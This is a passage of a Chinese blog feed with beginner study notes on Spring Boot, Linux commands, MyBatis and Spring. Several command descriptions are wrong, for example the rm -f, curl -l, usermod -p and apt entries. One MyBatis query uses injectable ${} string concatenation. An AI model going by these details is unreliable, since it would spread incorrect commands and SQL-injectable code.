52zoufubo    driver-class-name: com.mysql.cj.jdbc.Driver</code></pre><p>（2）配置mybatis扫描包别名和Mapper.xml文件路径</p><pre><code class="properties">mybatis.typeAliasesPackage=com.dingxiang.springboot_web_01.entitiesmybatis.mapperLocations=classpath:mapper/*.xml</code></pre><pre><code class="yml">mybatis:  type-aliases-package: com.dingxiang.springboot_web_01.entities  mapper-locations: classpath:mapper/*Mapper.xml</code></pre><p>（3）在Springboot启动类中添加Mapper接口扫描注解</p><pre><code class="java">@MapperScan(basePackages = {&quot;com.dingxiang.springboot_web_01.mapper&quot;})</code></pre><h3 id="一些工具使用"><a href="#一些工具使用" class="headerlink" title="一些工具使用"></a>一些工具使用</h3><p><strong>dto转entity</strong>:使用spring中的BeanUtils</p><pre><code>BeanUtils.copyProperties(userInputDTO,user);</code></pre>]]></content>
    
    <summary type="html">
    
      SpringBoot，Spring Boot 是所有基于 Spring 开发的项目的起点。Spring Boot 的设计是为了让你尽可能快的跑起来 Spring 应用程序并且尽可能减少你的配置文件。
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="分布式" scheme="https://www.dzou.top/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
      <category term="SpringBoot" scheme="https://www.dzou.top/tags/SpringBoot/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="后端" scheme="https://www.dzou.top/tags/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="Spring" scheme="https://www.dzou.top/tags/Spring/"/>
    
      <category term="微服务" scheme="https://www.dzou.top/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>linux学习笔记--更新中 基本知识和常用命令教程 Java程序员必备 较为详细 从基础开始(值得收藏)</title>
    <link href="https://www.dzou.top/post/19e1cc75.html"/>
    <id>https://www.dzou.top/post/19e1cc75.html</id>
    <published>2019-07-24T01:36:09.000Z</published>
    <updated>2019-08-02T11:50:04.535Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux-Ubuntu-deepin"><a href="#Linux-Ubuntu-deepin" class="headerlink" title="Linux(Ubuntu/deepin)"></a>Linux(Ubuntu/deepin)</h2><p>特点：没有磁盘的概念，每个用户只能操作根目录下的一个用户文件夹/home<br>/ 代表根目录<br>.代表当前目录或者隐藏文件文件夹<br>..代表上一级目录<br>*代表任意字符<br>文件名和文件数据分开存储的</p><h2 id="终端命令"><a href="#终端命令" class="headerlink" title="终端命令"></a>终端命令</h2><p><strong>pwd</strong><br>print work directory  输出当前目录</p><p><strong>mkdir</strong><br>make directory 创建文件夹<br>mldir -p a/b/c/d 创建多个文件夹 在a下创建b，b下创建c，c下常见d</p><p><strong>ls</strong><br>列出当前目录下的文件夹和文件<br>-lh 列出文件和文件夹的具体信息<br>-a 包括隐藏文件和文件夹<br>[]包含括号里的项（类似正则表达式）<br>？任意一个字符<br>*任意多个字符</p><p><strong>clear</strong><br>清屏</p><p><strong>cd</strong><br>change directory 变换目录<br>cd .       cd  ..      cd /<br>使用tab自动补全</p><p><strong>touch</strong><br>当前目录下创建文件</p><p><strong>–help</strong><br>命令的相关信息</p><p><strong>rm</strong><br>rm使用须谨慎，删除的东西找不到，不要在根目录里使用rm<br>rm -r 删除文件夹和目录<br>rm 只能删除文件<br>rm -f删除文件夹和目录</p><p><strong>cp</strong><br>cp -r<br>复制文件文件夹</p><p><strong>mv</strong><br>重命名文件文件夹</p><p><strong>grep</strong><br>查找文本中有某单词<br>grep -i忽略大小写<br>grep -n显示匹配行和行号<br>grep -v显示不包含文本的所有行（取反）<br>^匹配文本头<br>￥匹配文本尾</p><p><strong>cat、more</strong><br>显示文本中内容<br>-b空行无序号<br>-n所有行有序号</p><p><strong>ehco</strong><br>在终端显示输入的文本<br>与重定向联合使用（重定向&gt; or &gt;&gt;：把终端的文本追加或输出到文件中）<br>大于&gt; 输出到文本中<br>远大于&gt;&gt;追加到文本中</p><p><strong>|（管道）</strong><br>一个命令的输出通过管道可以通过另一个命令输入<br>ls -lha | more<br>ls -lha | grep 文本</p><p><strong>shutdown</strong><br>关机<br>-c取消</p><h2 id="ssh（windows安装putty或者shellx）"><a href="#ssh（windows安装putty或者shellx）" class="headerlink" title="ssh（windows安装putty或者shellx）"></a>ssh（windows安装putty或者shellx）</h2><p>使用secure shell协议（数据传输是加密的，数据传输是压缩的）连接到远程计算机的软件程序（linux默认安装，win需要手动）<br>ip：找到该计算机<br>端口号：找到计算机（服务器）上运行的应用程序   ip：端口号<br>域名：ip地址别名，方便记忆<br>免密登录：<br>①ssh-keygen 生成ssh密匙<br>②上传公匙到服务器，让服务器记住 ssh-copy-id -p port user@remote<br>id_rsa是私钥，需要放在自己电脑上用来登陆,对数据加密，特别重要！！！<br>id_rsa.pub是公钥，部署在服务器上用来校验<br>非对称加密：<br><img src="https://img-blog.csdnimg.cn/2019050810380247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>配置别名：<br>无需使用ssh -p port user@remote 只需使用ssh name</p><p><strong>ifconfig、ping ip地址</strong><br>ipconfig：查看计算机网卡信息<br>ping IP地址：查看与目标ip是否连接<br>ctrl+c终止终端命令</p><p><strong>scp</strong>（mac、windows使用ftp文件传输FileZilla）<br>在linux下远程拷贝文件<br>-p指定端口<br>scp -P port user/@remote:Desktop/01.txt<br>-r传送文件夹<br>scp -r demo user@remote:Desktop</p><h2 id="用户和权限"><a href="#用户和权限" class="headerlink" title="用户和权限"></a>用户和权限</h2><p><strong>用户管理包括用户和组管理，linux系统中必需拥有一个账号，不同的用户有不同的权限管理文件</strong><br><strong>组：对相同权限的用户放在一个组里</strong><br>r可读，w可写，x可执行<br>文件拥有者、文件的组、其他用户（r–、r-x）</p><p><strong>硬连接数：可通过几种方式访问文件</strong></p><p><strong>chmod</strong><br>chmod +/- rwx 文件名或者文件夹<br>ex：chmod -rw 123.txt 给123.txt减少可读可写权限<br>数字模式：<br>chmod -R 755 文件名或者目录 （三个数字分别对应拥有者、组、其他用户）<br>r-4 w-2 x-1<br><img src="https://img-blog.csdnimg.cn/20190507171143420.png" alt="在这里插入图片描述"></p><p><strong>su、sudo</strong><br>su：substitute user<br>sudo使用超级权限来执行</p><p><strong>组管理</strong><br>groupadd、groupdel、cat/etc/group 确认组信息<br>chgrp -P 组名 文件名或者目录 修改文件或者目录组</p><p><strong>用户（创建用户、设置密码、删除用户）</strong><br>useradd -m -g (m自动创建家目录 -g指定所属组）<br>passwd 设置密码<br>userdel （-f强制 -p）<br>who、whoami（查看哪些用户登录、该用户是谁）</p><p><strong>usermod</strong><br>-p 修改主组<br>-G 修改附加组<br>usermod -s /bin/bash 用户名    修改shell模式</p><p><strong>chown</strong><br>修改拥有者<br>chown 用户名 文件名或者目录</p><p><strong>Bash(GNU Bourne-Again Shell)是许多Linux平台的内定Shell<br>鉴于 bash 过于复杂，有人把 bash 从 NetBSD 移植到 Linux 并更名为 dash (Debian Almquist Shell)，并建议将 /bin/sh 指向它，以获得更快的脚本执行速度。</strong></p><p><strong>/etc/passwd 用户保存用户信息的文件<br>/usr/bin/passwd 修改用户密码的程序</strong></p><p><strong>which：查看命令所在位置</strong></p><p><strong>/bin  二进制可执行文件<br>/sbin  系统管理员专用二进制管理文件<br>/usr/bin 后期安装的一些程序<br>usr/sbin  超级用户的一些管理程序</strong></p><h2 id="与系统有关的终端命令"><a href="#与系统有关的终端命令" class="headerlink" title="与系统有关的终端命令"></a>与系统有关的终端命令</h2><p><strong>date：当前系统时间<br>cal：查看当前月的日历<br>df -h：diskfree 显示磁盘剩余空间<br>du -h目录：diskusage目录占有空间</strong></p><p><strong>进程：当前正在运行的一个程序就一个进程</strong><br> ps aux显示详细进程信息<br> top 动态显示运行中的程序并排序（q退出）<br> kill  [-9] 进程代号  终止指定代号的进程 -9表示强行终止</p><p><strong>查找文件</strong><br> find [路径] -name “*.py” 查找.py结尾的文件 -name后面跟指定条件</p><p><strong>软链接、硬链接</strong><br>软链接：ln -s 被链接的源文件 链接文件 （类似windows下快捷方式，使用绝对路径）<br>硬链接：ln 被链接的源文件 链接文件 （硬链接即是一个文件的另一个文件名，只有硬链接数为0，文件才被删除）</p><p><strong>打包压缩</strong><br>打包：tar -cvf 打包文件名.tar 被打包文件 （被打包文件空格隔开）<br>解包：tar -xvf 打包文件<br>压缩：（1）gzip  （生成.tar.gz结尾文件）-z（2）bzip2（生成tar.bz2结尾文件）-j<br>    tar -zcvf 打包文件名.tar.gz 被压缩文件    tar -jcvf 打包文件名.tar.bz2 被压缩文件<br>解压缩：-C 路径 表示解压缩到指定路径<br>    tar -zxvf 打包文件名.tar.gz                        tar -jxvf 打包文件名.tar.bz2</p><p><strong>安装卸载软件</strong><br>apt（advanced packing tool）在终端中方便的安装/卸载/更新软件包<br>（1）安装： sudo apt install<br>（2）安装： sudo apt remove<br>（3）安装： sudo aptupgrade<br><img src="https://img-blog.csdnimg.cn/20190508103816882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="Vim、Vi"><a href="#Vim、Vi" class="headerlink" title="Vim、Vi"></a>Vim、Vi</h2><p>三个模式：一般模式、命令模式、编辑模式<br>一般模式：只能上下左右移动（按a键进入编辑模式，shift+：进入命令模式）<br>命令模式：保存、退出等命令<br>编辑模式：增删改查（esc退出到一半模式）</p><h2 id="curl、wget下载文件"><a href="#curl、wget下载文件" class="headerlink" title="curl、wget下载文件"></a>curl、wget下载文件</h2><p><strong>curl</strong><br>curl命令是个功能强大的网络工具，支持通过http、ftp等方式下载文件、上传文件。还可以用来抓取网页、网络监控等方面的开发<br>GET请求<br>curl <a href="http://www.baidu.com，回车之后，HTML内容打印在屏幕上；如果这里的URL指向的是一个文件或者一幅图都可以直接下载到本地。" rel="external nofollow noopener noreferrer" target="_blank">http://www.baidu.com，回车之后，HTML内容打印在屏幕上；如果这里的URL指向的是一个文件或者一幅图都可以直接下载到本地。</a><br>curl -i “<a href="http://www.baidu.com&quot;" rel="external nofollow noopener noreferrer" target="_blank">http://www.baidu.com&quot;</a>  显示全部信息<br>curl -l “<a href="http://www.baidu.com&quot;" rel="external nofollow noopener noreferrer" target="_blank">http://www.baidu.com&quot;</a> 只显示头部信息</p><ul><li>-v/–verbose 小写的v参数，用于打印更多信息，包括发送的请求信息，这在调试脚本是特别有用。</li><li>-m/–max-time <seconds> 指定处理的最大时长</seconds></li><li>-H/–header <header> 指定请求头参数</header></li><li>-s/–slient 减少输出的信息，比如进度</li><li>–connect-timeout <seconds> 指定尝试连接的最大时长</seconds></li><li>-x/–proxy &lt;proxyhost[:port]&gt; 指定代理服务器地址和端口，端口默认为1080</li><li>-T/–upload-file <file> 指定上传文件路径</file></li><li>-o/–output <file> 指定输出文件名称</file></li><li>-d/–data/–data-ascii <data> 指定POST的内容</data></li><li>–retry <num> 指定重试次数</num></li><li>-e/–referer <url> 指定引用地址</url></li><li>-I/–head 仅返回头部信息，使用HEAD请求</li></ul><p><strong>wget</strong><br>用于从网络上下载资源，没有指定目录，下载资源回默认为当前目录</p><p>启动参数：</p><ul><li><p>-V, –version 显示wget的版本后退出</p></li><li><p>-h, –help 打印语法帮助</p></li><li><p>-b, –background 启动后转入后台执行</p></li><li><p>-e, –execute=COMMAND 执行`.wgetrc’格式的命令，wgetrc格式参见/etc/wgetrc或~/.wgetrc</p></li></ul><p>实例：使用wget下载单个文件</p><p>wget <a href="http://www.minjieren.com/wordpress-3.1-zh_CN.zip" rel="external nofollow noopener noreferrer" target="_blank">http://www.minjieren.com/wordpress-3.1-zh_CN.zip</a></p>]]></content>
    
    <summary type="html">
    
      Linux基础命令
    
    </summary>
    
      <category term="linux" scheme="https://www.dzou.top/categories/linux/"/>
    
    
      <category term="deepin" scheme="https://www.dzou.top/tags/deepin/"/>
    
      <category term="linux" scheme="https://www.dzou.top/tags/linux/"/>
    
      <category term="Ubuntu" scheme="https://www.dzou.top/tags/Ubuntu/"/>
    
      <category term="ssh" scheme="https://www.dzou.top/tags/ssh/"/>
    
      <category term="服务器" scheme="https://www.dzou.top/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Mybatis框架学习笔记--更新中 JavaWeb之Mysql（SSM之Mybatis）适合初学者阅读,知识点较为全面 包括mybatis大部分语法 相关配置(值得收藏)</title>
    <link href="https://www.dzou.top/post/3c21ad0c.html"/>
    <id>https://www.dzou.top/post/3c21ad0c.html</id>
    <published>2019-07-24T01:31:03.000Z</published>
    <updated>2019-08-02T14:30:50.961Z</updated>
    
    <content type="html"><![CDATA[<h2 id="POJO、Javabean"><a href="#POJO、Javabean" class="headerlink" title="POJO、Javabean"></a>POJO、Javabean</h2><p><strong>首先我们来看一下pojo和javabean<br>pojo是一种java的普通对象，没有任何类继承、没有任何接口实现、没有任何框架接入的对象<br>javanbean可以看做是一种特殊的pojo对象，它是由java写成的可重用组件，是一种规范的写法，而不是一种技术，以下是它的规范性：<br>1.所有属性为private。<br>2.这个类必须有一个公共的缺省构造函数。即是提供无参数的构造器。<br>3.这个类的属性使用getter和setter来访问，其他方法遵从标准命名规范。<br>4.这个类应是可序列化的。实现serializable接口。<br>区别：POJO主要用于数据的临时传递，它只能装载数据，而不具有业务逻辑处理的能力。<br>Javabean虽然数据的获取与POJO一样，但是javabean当中可以有其它的方法。</strong></p><h2 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h2><p>是支持定制化sql、存储过程以及高级映射的持久化框架<br><strong>简化了数据库连接，精力放在关注sql语句</strong><br>1.mybatis开发dao两种方法：</p><ul><li>servlet（dao接口 dao实现）</li><li>mybatis mapper接口（dao接口）代理开发</li></ul><p>2.mybatis配置文件 sqlMapConfig.xml<br>3.核心：输入映射、输出映射<br>4.mybatis动态sql</p><p>JDBC问题总结：</p><ul><li>1.数据库连接：连接数据库过于频繁，资源浪费，影响数据库性能</li><li>2.sql语句：sql需要修改时，需要重新编译java代码，硬编码，不利于系统维护（mybatis：把sql配置到xml中，java代码无需重新编译）</li><li>3.preparestatement设置参数符号位置 硬编码（mybatis：把参数配置到配置文件）</li><li>4.结果集（resultset）遍历数据时对表的字段 硬编码（mybatis：查询的结果集映射成java对象）</li></ul><h2 id="SqlMapConfig"><a href="#SqlMapConfig" class="headerlink" title="SqlMapConfig"></a>SqlMapConfig</h2><p><strong>SqlMapConfig（配置文件、配置sql语句、mapper、mapper2…）</strong></p><pre><code class="sql">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration  PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;  &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt;  &lt;environments default=&quot;development&quot;&gt;    &lt;environment id=&quot;development&quot;&gt;      &lt;transactionManager type=&quot;JDBC&quot;/&gt;      &lt;dataSource type=&quot;POOLED&quot;&gt;        &lt;property name=&quot;driver&quot; value=&quot;${driver}&quot;/&gt;        &lt;property name=&quot;url&quot; value=&quot;${url}&quot;/&gt;        &lt;property name=&quot;username&quot; value=&quot;${username}&quot;/&gt;        &lt;property name=&quot;password&quot; value=&quot;${password}&quot;/&gt;      &lt;/dataSource&gt;    &lt;/environment&gt;  &lt;/environments&gt;  &lt;mappers&gt;    &lt;mapper resource=&quot;org/mybatis/example/BlogMapper.xml&quot;/&gt;  &lt;/mappers&gt;&lt;/configuration&gt;</code></pre><h3 id="SqlSessionFactory"><a href="#SqlSessionFactory" class="headerlink" title="SqlSessionFactory"></a>SqlSessionFactory</h3><p>（SqlSessionFactoryBuilder创建）:创建SqlSession</p><h3 id="SqlSession"><a href="#SqlSession" class="headerlink" title="SqlSession"></a>SqlSession</h3><p>操作数据库</p><h3 id="Excutor（执行器）"><a href="#Excutor（执行器）" class="headerlink" title="Excutor（执行器）"></a>Excutor（执行器）</h3><p>SqlSession内执行器操作数据库</p><h3 id="mapped-statement"><a href="#mapped-statement" class="headerlink" title="mapped statement"></a>mapped statement</h3><p>（底层封装对象）：Java对象输入输出结果集</p><p><strong>占位符：#{} ‘1’=‘1’，“wang”=“wang”<br>字符串拼接${}：1=1，wang=wang (模糊查询使用 ‘%${_parameter}%’) **<br>**方式能够很大程度防止sql注入。</strong><br>$方式无法防止Sql注入。</p><h3 id="映射器类可以使用两种方法"><a href="#映射器类可以使用两种方法" class="headerlink" title="映射器类可以使用两种方法"></a>映射器类可以使用两种方法</h3><ul><li><p>1.Java注解：较为复杂的语句力不从心、不方便阅读、尽量使用XML</p></li><li><p>2.XML：较为复杂，但是便于阅读，功能强大</p></li></ul><pre><code class="sql">public interface BlogMapper {  @Select(&quot;SELECT * FROM blog WHERE id = #{id}&quot;)  Blog selectBlog(int id);}</code></pre><p><strong>2.XML配置</strong></p><pre><code class="sql">&lt;mapper namespace=&quot;org.mybatis.example.BlogMapper&quot;&gt;  &lt;select id=&quot;selectBlog&quot; resultType=&quot;Blog&quot;&gt;    select * from Blog where id = #{id}  &lt;/select&gt;&lt;/mapper&gt;</code></pre><h2 id="Mybatis中Mapper动态代理的实现原理"><a href="#Mybatis中Mapper动态代理的实现原理" class="headerlink" title="Mybatis中Mapper动态代理的实现原理"></a>Mybatis中Mapper动态代理的实现原理</h2><p><strong>定义一个接口 方法名，参数需要与XML定义保持一致。<br>namespace必须对应着map接口的全类名<br>思想：还不够深入，继续学习</strong></p><p><strong>！！！学会了：Junit单元测试：添加注解@Test 测试单个函数、类</strong></p><h2 id="SqlMapConfig主配置文件"><a href="#SqlMapConfig主配置文件" class="headerlink" title="SqlMapConfig主配置文件"></a>SqlMapConfig主配置文件</h2><h3 id="properties、property属性"><a href="#properties、property属性" class="headerlink" title="properties、property属性"></a>properties、property属性</h3><h4 id="三种方式设置property"><a href="#三种方式设置property" class="headerlink" title="三种方式设置property"></a>三种方式设置property</h4><ul><li><strong>1.通过&lt;properties元素里面配置&lt;property元素</strong></li><li><strong>2.单独编写property文件，通过properties导入</strong></li></ul><pre><code class="java">&lt;properties resource=&quot;mysql.properties&quot;&gt;    &lt;/properties&gt;</code></pre><ul><li><strong>3.人工编写property类</strong></li></ul><p>优先级次序如下：第三种方式&gt;第二种方式&gt;第一种方式。即如果三种方式都配置了同一个配置项，那么优先级高的配置方式的配置值生效。</p><h3 id="typeAliases配置别名"><a href="#typeAliases配置别名" class="headerlink" title="typeAliases配置别名"></a>typeAliases配置别名</h3><p>我们在使用 com.demo.entity. UserEntity 的时候，我们可以直接配置一个别名user, 这样以后在配置文件中要使用到com.demo.entity. UserEntity的时候，直接使用User即可</p><pre><code class="java">以包名配置（多个bean）：&lt;typeAliases&gt;        &lt;package name=&quot;com.bean&quot;/&gt;&lt;/typeAliases&gt;</code></pre><h3 id="mappers（映射器）"><a href="#mappers（映射器）" class="headerlink" title="mappers（映射器）"></a>mappers（映射器）</h3><p><strong>配置多个mapper：尽量使用package name：mapper包<br>当mapper过多时，一个一个添加mapper太过麻烦</strong><br>告诉 MyBatis 到哪里去找到这些sql映射语句</p><ol><li><p>使用相对于类路径的资源引用 -<br>&lt;mapper resource=”org/mybatis/builder/AuthorMapper.xml”/</p></li><li><p>使用完全限定资源定位符（URL）<br>&lt;mapper url=”file:///var/mappers/AuthorMapper.xml”/</p></li><li><p>使用映射器接口实现类的完全限定类名<br>&lt;mapper class=”org.mybatis.builder.AuthorMapper”/</p></li><li><p>将包内的映射器接口实现全部注册为映射器<br>&lt;package name=”org.mybatis.builder”/</p></li></ol><h3 id="paparmeterType输入映射"><a href="#paparmeterType输入映射" class="headerlink" title="paparmeterType输入映射"></a>paparmeterType输入映射</h3><p>1.基本数据类型 int、String等:username<br>2.pojo（plain old java object）对象：当输入映射为pojo对象时，对应的占位符应该是对象的属性值username<br>3.pojo封装对象：即一个对象里包含另一个对象，对应的的占位符为包装对象的属性值user.username</p><h3 id="resultType、resultMap输出映射"><a href="#resultType、resultMap输出映射" class="headerlink" title="resultType、resultMap输出映射"></a>resultType、resultMap输出映射</h3><ul><li><p><strong>resultType：自动映射，一般用于数据库和bean对象名称一致时，无需建立数据库和bean对象属性的映射</strong></p></li><li><p><strong>resultMap：手动映射，一般用于数据库和bean对象属性名不完全匹配</strong></p></li></ul><pre><code class="sql">&lt;select id=&quot;getAllCountry&quot; resultMap=&quot;Map&quot;&gt;        select * from country    &lt;/select&gt;    &lt;resultMap id=&quot;Map&quot; type=&quot;Country&quot;&gt;    把bean对象的属性id和数据库键名称c_id映射        &lt;result property=&quot;id&quot; column=&quot;c_id&quot;/&gt;    &lt;/resultMap&gt;</code></pre><h2 id="关联查询"><a href="#关联查询" class="headerlink" title="关联查询"></a>关联查询</h2><ul><li>（1）一对一关联查询：查询一个对象时，把与该对象关联的一个对象查询出来</li><li>（2）一对多关联查询：查询一个对象时，同时把与该对象关联的其他多个对象查询出来<br>一对一关联查询：查询用户表对应的与国家关联的所有信息 javaType普通类对象<br>需要使用resultMap里的association id一般指定主键，result指定其他任意键（提高性能）</li></ul><pre><code class="sql">&lt;select id=&quot;assioationSelect&quot; resultMap=&quot;Uservo2&quot;&gt;        select user.u_id,        user.u_username,        user.u_sex,        country.c_id,        country.c_countryname        from user        left join        country on        user.u_id=country.c_id;    &lt;/select&gt;&lt;resultMap id=&quot;Uservo2&quot; type=&quot;UserVo2&quot;&gt;        &lt;id property=&quot;u_id&quot; column=&quot;u_id&quot;/&gt;        &lt;result property=&quot;u_sex&quot; column=&quot;u_sex&quot;/&gt;        &lt;result property=&quot;u_username&quot; column=&quot;u_username&quot;/&gt;        &lt;association property=&quot;country&quot; javaType=&quot;Country&quot;&gt;            &lt;id property=&quot;id&quot; column=&quot;c_id&quot;/&gt;            &lt;result property=&quot;c_countryname&quot; column=&quot;c_countryname&quot;/&gt;        &lt;/association&gt;    &lt;/resultMap&gt;</code></pre><p>这里使用一个User的继承包装类，包装了国家类，包含国家对象和用户类的属性，重写了toString（）方法，查询u_id等于c_id的记录</p><p><strong>一对多关联查询：查询国家表里与用户关联的所有信息<br>需要使用resultMap里的collection 其他与一对一关联查询一致 ofType:集合属性的泛型类型</strong></p><pre><code class="sql">&lt;select id=&quot;connectionSelect&quot; resultMap=&quot;CountryVo&quot;&gt;        select country.c_id,        country.c_countryname,        user.u_id,        user.u_username,        user.u_sex        from country        left join user on        user.u_id=country.c_id;    &lt;/select&gt;    &lt;resultMap id=&quot;CountryVo&quot; type=&quot;CountryVo&quot;&gt;        &lt;id property=&quot;id&quot; column=&quot;c_id&quot;/&gt;        &lt;result property=&quot;c_countryname&quot; column=&quot;c_countryname&quot;/&gt;        &lt;collection property=&quot;userList&quot; ofType=&quot;User&quot;&gt;            &lt;id property=&quot;u_id&quot; column=&quot;u_id&quot;/&gt;            &lt;result property=&quot;u_username&quot; column=&quot;u_username&quot;/&gt;            &lt;result property=&quot;u_sex&quot; column=&quot;u_sex&quot;/&gt;        &lt;/collection&gt;    &lt;/resultMap&gt;</code></pre><h2 id="动态sql语句"><a href="#动态sql语句" class="headerlink" title="动态sql语句"></a>动态sql语句</h2><h3 id="多条件查询"><a href="#多条件查询" class="headerlink" title="多条件查询"></a>多条件查询</h3><pre><code class="sql">select * from user where u_sex=#{u_sex} and u_username like &quot;%${u_username}%&quot; and u_cid=#{u_cid}</code></pre><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><pre><code class="sql">&lt;if test=&quot;title != null&quot;&gt;    AND title like #{title}  &lt;/if&gt;</code></pre><h3 id="where"><a href="#where" class="headerlink" title="where"></a>where</h3><p>解决and符号存在where之后造成sql语法错误</p><pre><code class="sql">&lt;where&gt;            &lt;if test=&quot;u_sex!=null and u_sex!=&#39;&#39;&quot;&gt;                u_sex=#{u_sex}            &lt;/if&gt;            &lt;if test=&quot;u_username!=null and u_username!=&#39;&#39;&quot;&gt;                and u_username like &quot;%&quot;#{u_username}&quot;%&quot;            &lt;/if&gt;            &lt;if test=&quot;u_cid!=null&quot;&gt;                and u_cid=#{u_cid}            &lt;/if&gt;&lt;/where&gt;</code></pre><h3 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h3><p>prefix suffix prefixOverrides suffixOverrides 分别表示where的前后位置和and、or的前后位置</p><pre><code class="sql">&lt;trim prefix=&quot;WHERE&quot; prefixOverrides=&quot;AND |OR &quot;&gt;  ...&lt;/trim&gt;</code></pre><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>用于动态包含需要更新的列，而舍去其它的。解决字段后逗号问题</p><pre><code class="sql">update Author    &lt;set&gt;      &lt;if test=&quot;username != null&quot;&gt;username=#{username},&lt;/if&gt;      &lt;if test=&quot;password != null&quot;&gt;password=#{password},&lt;/if&gt;      &lt;if test=&quot;email != null&quot;&gt;email=#{email},&lt;/if&gt;      &lt;if test=&quot;bio != null&quot;&gt;bio=#{bio}&lt;/if&gt;    &lt;/set&gt;  where id=#{id}</code></pre><h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><p>动态 SQL 的另外一个常用的操作需求是对一个集合进行遍历，通常是在构建 IN 条件语句的时候。 可以是数组或者集合 collection分别为array、list</p><pre><code class="sql">&lt;select id=&quot;getByIds&quot; resultType=&quot;User&quot;&gt;        select * from user where u_id in        &lt;foreach collection=&quot;array&quot; item=&quot;id&quot; open=&quot;(&quot; close=&quot;)&quot; separator=&quot;,&quot;&gt;            #{id}        &lt;/foreach&gt;    &lt;/select&gt;</code></pre><p><strong>sql语句：缩减mapper语句 ，可以把重复的语句写在sql标签中，再在select等语句中通过include标签加入</strong></p><h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><p>使用${}拼接字符串无法防止sql注入，bind标签可以解决这个问题</p><pre><code class="sql">&lt;bind name=&quot;username&quot; value=&quot;&#39;%&#39;+u_username+&#39;%&#39;&quot;/&gt;select * from user u_username like #{username}</code></pre>]]></content>
    
    <summary type="html">
    
      Mybatis是支持定制化sql、存储过程以及高级映射的持久化框架简化了数据库连接，精力放在关注sql语句
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="后端" scheme="https://www.dzou.top/tags/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="Mybatis" scheme="https://www.dzou.top/tags/Mybatis/"/>
    
      <category term="Mysql" scheme="https://www.dzou.top/tags/Mysql/"/>
    
      <category term="sql" scheme="https://www.dzou.top/tags/sql/"/>
    
      <category term="持久层" scheme="https://www.dzou.top/tags/%E6%8C%81%E4%B9%85%E5%B1%82/"/>
    
      <category term="数据库" scheme="https://www.dzou.top/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>Spring框架学习笔记--更新中(SSM第一部分) 从介绍Spring以及理解实现方法到Spring核心知识 教你上手使用Spring(适合收藏)</title>
    <link href="https://www.dzou.top/post/c519ea2a.html"/>
    <id>https://www.dzou.top/post/c519ea2a.html</id>
    <published>2019-07-24T01:26:12.000Z</published>
    <updated>2019-08-02T11:52:37.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Srping"><a href="#Srping" class="headerlink" title="Srping"></a>Srping</h2><p>一个轻量级java开发框架，为解决应用开发的业务逻辑层和其他层耦合问题，full-stack一站式框架专注于应用程序的开发</p><p><strong>Spring不取代框架，而是把他们无缝连接</strong><br><strong>新的编程思想</strong>：</p><ul><li>IOC反转：由我们自己执行反转给Spring帮我们执行</li><li>IOC控制：由Spring帮我们创建、掌控对象周期，在我们需要的时候向Spring申请即可</li><li>DI：依赖注入</li></ul><h3 id="DI依赖注入"><a href="#DI依赖注入" class="headerlink" title="DI依赖注入"></a>DI依赖注入</h3><p>理解DI的关键是：“谁依赖谁，为什么需要依赖，谁注入谁，注入了什么”，那我们来深入分析一下：</p><ul><li>　　谁依赖于谁：当然是应用程序依赖于IoC容器；</li><li>　　为什么需要依赖：应用程序需要IoC容器来提供对象需要的外部资源；</li><li>　　谁注入谁：很明显是IoC容器注入应用程序某个对象，应用程序依赖的对象；</li><li>　　注入了什么：就是注入某个对象所需要的外部资源（包括对象、资源、常量数据）。</li></ul><h3 id="ApplicationContext接口"><a href="#ApplicationContext接口" class="headerlink" title="ApplicationContext接口"></a>ApplicationContext接口</h3><p>每次容器启动时就会创建容器中配置的所有对象，除此之外，还提供了更多丰富的功能。<br>典型的实现类：</p><ul><li>从类路径下加载配置文件（常用）：ClassPathXmlApplicationContext</li><li>从硬盘绝对路径下加载配置文件：FileSystemXmlApplicationContext</li></ul><h2 id="bean标签"><a href="#bean标签" class="headerlink" title="bean标签"></a>bean标签</h2><p>：配置bean对象（需要容器管理的对象）</p><ul><li><p>通过set、构造方法、复杂类型注入给bean对象幅值，即把对象交给spring管理，value为基本类型 ref引用调用对象 type指定参数类型来调用对应的构造方法</p></li><li><p>name属性起一个名字，是获取bean对象的参数getbean（name）</p></li><li><p>class属性是一个包名，spring通过这个包名创建对象</p></li></ul><p>1.set方法注入 property</p><pre><code class="java">    &lt;bean name=&quot;basketball&quot; class=&quot;com.bean.Player&quot;&gt;        &lt;property name=&quot;player_name&quot; value=&quot;kobe_bryant&quot;/&gt;        &lt;property name=&quot;player_type&quot; value=&quot;basketball&quot;/&gt;    &lt;/bean&gt;</code></pre><p>2.构造方法注入 